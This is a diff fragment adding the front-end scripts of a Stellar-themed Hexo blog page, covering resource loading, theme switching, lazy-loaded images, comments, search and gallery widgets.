+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+  <script type="module">
+  const el = document.querySelector('#comments #beaudar');
+  util.viewportLazyload(el, load_beaudar, false);
+
+  function load_beaudar() {
+    if (!el) return;
+    try {
+      el.innerHTML = '';
+    } catch (error) {
+      console.error(error);
+    }
+    const script = document.createElement('script');
+    script.src = 'https://beaudar.lipk.org/client.js';
+    script.async = true;
+    for (const key of Object.keys(el.attributes)) {
+      const attr = el.attributes[key];
+      if (['class', 'id'].includes(attr.name) === false) {
+        script.setAttribute(attr.name, attr.value);
+      }
+    }
+    el.appendChild(script);
+  }
+</script>
+
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-screen-webfont@1.7.0/style.min.css" media="all">
+
+
+
+<!-- inject -->
+
+</div></body></html>
